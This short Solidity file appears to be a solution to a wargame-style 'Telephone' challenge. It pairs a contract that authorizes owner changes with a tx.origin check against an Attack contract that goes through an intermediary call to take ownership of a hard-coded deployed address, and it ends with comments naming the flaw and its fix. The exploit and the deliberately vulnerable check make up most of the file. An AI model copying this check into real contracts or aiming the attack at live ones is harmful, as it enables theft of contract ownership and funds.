// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack{
    Telephone telephone = Telephone(0x5966C09a6D3B5dD80501d386BD6a56AC4Fb42078);

      address public owner;

    function attack() public {
        // Me --> Attack.attack() ----> telephone.changeOwner()
        // Tx.origin = me
        // msg.sender = contract(Attack)
        telephone.changeOwner(msg.sender);
    }
}



contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


// Vulnerability
// tx.origin can be used for phishing

// Recommended Mitigation steps
// Never use tx.origin instead always use msg.sender